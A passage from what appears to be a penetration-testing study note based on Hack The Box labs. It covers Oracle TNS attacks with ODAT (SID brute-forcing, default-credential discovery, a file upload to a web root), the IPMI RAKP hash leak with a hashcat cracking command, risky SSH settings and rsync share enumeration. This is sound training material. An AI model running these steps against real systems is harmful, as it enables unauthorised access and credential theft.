               &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
               ...

            _  __   _  ___ 
           / &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;_ _|
          &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; o &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; o &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; o &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; | 
           &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/|__/|_n_||_| 
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------&lt;/span&gt;
  _        __           _           ___ 
 / &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     |  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;        / &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;        |_ _|
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; o &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;       o &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         o |         | | 
 &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/racle |__/atabase |_n_|ttacking |_|ool 
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------&lt;/span&gt;

By Quentin Hardy &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;quentin.hardy@protonmail.com or quentin.hardy@bt.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oracle Database Attacking Tool (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ODAT&lt;/code&gt;) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.&lt;/p&gt;

&lt;p&gt;Let’s now use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan the default Oracle TNS listener port.&lt;/p&gt;

&lt;h4 id=&quot;nmap&quot;&gt;Nmap&lt;/h4&gt;

&lt;p&gt;Oracle TNS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p1521&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.129.204.235 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt;

Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-06 10:59 EST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.204.235
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0041s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;6.64 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nmap---sid-bruteforcing&quot;&gt;Nmap - SID Bruteforcing&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p1521&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.129.204.235 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; oracle-sid-brute

Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-06 11:01 EST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.204.235
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0044s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;55.40 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;odat.py&lt;/code&gt; tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;all&lt;/code&gt; option and try all modules of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;odat.py&lt;/code&gt; tool.&lt;/p&gt;

&lt;h4 id=&quot;odat&quot;&gt;ODAT&lt;/h4&gt;

&lt;p&gt;Oracle TNS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./odat.py all &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.129.204.235

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;target 10.129.204.235:1521 is well configured &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a connection...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] According to a &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Notice: &lt;span class=&quot;s1&quot;&gt;&apos;mdsys&apos;&lt;/span&gt; account is locked, so skipping this username &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;password           &lt;span class=&quot;c&quot;&gt;#####################| ETA:  00:01:16 &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Notice: &lt;span class=&quot;s1&quot;&gt;&apos;oracle_ocm&apos;&lt;/span&gt; account is locked, so skipping this username &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;password       &lt;span class=&quot;c&quot;&gt;#####################| ETA:  00:01:05 &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Notice: &lt;span class=&quot;s1&quot;&gt;&apos;outln&apos;&lt;/span&gt; account is locked, so skipping this username &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;password           &lt;span class=&quot;c&quot;&gt;#####################| ETA:  00:00:59&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Valid credentials found: scott/tiger. Continue...

...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As istance we found valid credentials for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scott&lt;/code&gt; and his password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tiger&lt;/code&gt;. After that, we can use the tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlplus&lt;/code&gt; to connect to the Oracle database and interact with it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlplus scott/tiger@10.129.204.235/XE

SQL&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;oracle-rdbms---file-upload&quot;&gt;Oracle RDBMS - File Upload&lt;/h4&gt;

&lt;p&gt;Oracle TNS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Oracle File Upload Test&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; testing.txt
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./odat.py utlfile &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.129.204.235 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; XE &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; scott &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; tiger &lt;span class=&quot;nt&quot;&gt;--sysdba&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--putFile&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;inetpub&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;wwwroot testing.txt ./testing.txt

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.204.235:1521&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Put the ./testing.txt &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] The ./testing.txt file was created on the C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot directory on the 10.129.204.235 server like the testing.txt file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ipmi&quot;&gt;IPMI&lt;/h1&gt;

&lt;p&gt;#ipmi&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.thomas-krenn.com/en/wiki/IPMI_Basics&quot;&gt;Intelligent Platform Management Interface&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPMI&lt;/code&gt;) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host’s BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system’s hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Before the OS has booted to modify BIOS settings&lt;/li&gt;
  &lt;li&gt;When the host is fully powered down&lt;/li&gt;
  &lt;li&gt;Access to a host after a system failure&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;nmap-1&quot;&gt;Nmap&lt;/h4&gt;

&lt;p&gt;IPMI&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; ipmi-version &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 623 ilo.inlanfreight.local

Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-04 21:48 GMT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ilo.inlanfreight.local &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;172.16.2.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00064s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Hewlett Packard Enterprise&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.46 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;NB:
&lt;em&gt;The short version: the RAKP protocol in the IPMI specification allows anyone to use IPMI commands to grab a HMAC IPMI password hash that can be cracked offline. Longer explanation follows. Here’s a &lt;a href=&quot;http://fish2.com/ipmi/tools/rak-the-ripper.pl&quot;&gt;little Perl program&lt;/a&gt; that implements it.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I guess you can file this in the … “well, I don’t think there are enough problems with IPMI with this new spec… what else can we do to sabatoge its security?”&lt;/p&gt;

&lt;p&gt;Prior to IPMI 2.0 the IPMI specs would encapsulate IP packets using the Remote Management Control Protocol (RMCP.) For 2.0 I can only surmise that they wanted to continue avoid sending the password over the network (at least, most, or some of the time, depending on options), so they introduce RMCP+, which offers “enhanced authentication” and extends IPMI over IP.&lt;/p&gt;

&lt;p&gt;Thus RAKP - the RMCP+ Authenticated Key-Exchange Protocol - was born. According to the specification (page 161):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;RAKP-HMAC-SHA1 uses pre-shared symmetric keys and HMAC-based integrity algorithms to mutually authenticate a remote console to a given managed system and to generate pair-wise unique symmetric keying material that can be used with a number of integrity and confidentiality algorithms to provide protection for RMCP messages.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;That sounds pretty good - so how does this work? As an illustration as to its underpinnings, an easy way to trigger RAKP is to use &lt;em&gt;ipmitool&lt;/em&gt; like below (the “chassis identify” in the example simply asks the BMC to say what it’s identify interval is) - you might note that the password given (“fluffy-wuffy”) is invalid, but it doesn’t matter, as we’re just starting up RAKP, we’re not interested in finishing it, and ipmitool requires some password, even if it’s wrong:&lt;/p&gt;

&lt;p&gt;$ &lt;strong&gt;ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 10.0.0.1 chassis identify&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;dangerous-settings-4&quot;&gt;Dangerous Settings&lt;/h2&gt;

&lt;p&gt;If default credentials do not work to access a BMC, we can turn to a &lt;a href=&quot;http://fish2.com/ipmi/remote-pw-cracking.html&quot;&gt;flaw&lt;/a&gt; in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user’s password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hashcat&lt;/code&gt; mode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7300&lt;/code&gt;. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u&lt;/code&gt;&lt;/strong&gt; which tries all combinations of upper case letters and numbers for an eight-character password&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- [ Built-in Charsets ] -  
  
 ? | Charset  
===+=========  
 l | abcdefghijklmnopqrstuvwxyz [a-z]  
 u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]  
 d | 0123456789                 [0-9]  
 h | 0123456789abcdef           [0-9a-f]  
 H | 0123456789ABCDEF           [0-9A-F]  
 s |  !&quot;#$%&amp;amp;&apos;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~  
 a | ?l?u?d?s  
 b | 0x00 - 0xff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;linux-remote-management-protocols&quot;&gt;Linux Remote Management Protocols&lt;/h1&gt;

&lt;h2 id=&quot;ssh&quot;&gt;SSH&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Secure_Shell&quot;&gt;Secure Shell&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP 22&lt;/code&gt;. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known &lt;a href=&quot;https://www.openssh.com/&quot;&gt;OpenBSD SSH&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenSSH&lt;/code&gt;) server on Linux distributions is an open-source fork of the original and commercial &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; server from SSH Communication Security. Accordingly, there are two competing protocols: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH-1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH-2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH-2&lt;/code&gt;, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH-1&lt;/code&gt; is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MITM&lt;/code&gt; attacks, whereas SSH-2 is not.&lt;/p&gt;

&lt;p&gt;Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Password authentication&lt;/li&gt;
  &lt;li&gt;Public-key authentication&lt;/li&gt;
  &lt;li&gt;Host-based authentication&lt;/li&gt;
  &lt;li&gt;Keyboard authentication&lt;/li&gt;
  &lt;li&gt;Challenge-response authentication&lt;/li&gt;
  &lt;li&gt;GSSAPI authentication   &lt;a href=&quot;https://app.hackthebox.com/machines/TheFrizz&quot;&gt;The Frizz HTB&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;dangerous-settings-5&quot;&gt;Dangerous Settings&lt;/h2&gt;

&lt;p&gt;Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Setting&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PasswordAuthentication yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allows password-based authentication.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PermitEmptyPasswords yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allows the use of empty passwords.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PermitRootLogin yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allows to log in as the root user.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Protocol 1&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Uses an outdated version of encryption.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X11Forwarding yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allows X11 forwarding for GUI applications.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllowTcpForwarding yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allows forwarding of TCP ports.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PermitTunnel&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allows tunneling.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DebianBanner yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Displays a specific banner when logging in.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;rsync&quot;&gt;Rsync&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/1/rsync&quot;&gt;Rsync&lt;/a&gt; is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;873&lt;/code&gt; and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.&lt;/p&gt;

&lt;p&gt;This &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync&quot;&gt;guide&lt;/a&gt; covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.&lt;/p&gt;

&lt;p&gt;Let’s do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.&lt;/p&gt;

&lt;h4 id=&quot;scanning-for-rsync&quot;&gt;Scanning for Rsync&lt;/h4&gt;

&lt;p&gt;Linux Remote Management Protocols&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 873 127.0.0.1

Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-09-19 09:31 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;localhost &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0058s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE VERSION
873/tcp open  rsync   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol version 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.13 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;enumerating-an-open-share&quot;&gt;Enumerating an Open Share&lt;/h4&gt;

&lt;p&gt;Here we can see a share called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt;, and we can enumerate it further.&lt;/p&gt;

&lt;p&gt;Linux Remote Management Protocols&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync &lt;span class=&quot;nt&quot;&gt;-av&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--list-only&lt;/span&gt; rsync://127.0.0.1/dev

receiving incremental file list
drwxr-xr-x             48 2022/09/19 09:43:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;              0 2022/09/19 09:34:50 build.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;              0 2022/09/19 09:36:02 secrets.yaml
drwx------             54 2022/09/19 09:43:10 .ssh

sent 25 bytes  received 221 bytes  492.00 bytes/sec
total size is 0  speedup is 0.00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;a href=&quot;https://en.wikipedia.org/wiki/Berkeley_r-commands&quot;&gt;R-commands&lt;/a&gt; suite consists of the following programs:&lt;/p&gt;

&lt;ul&gt;
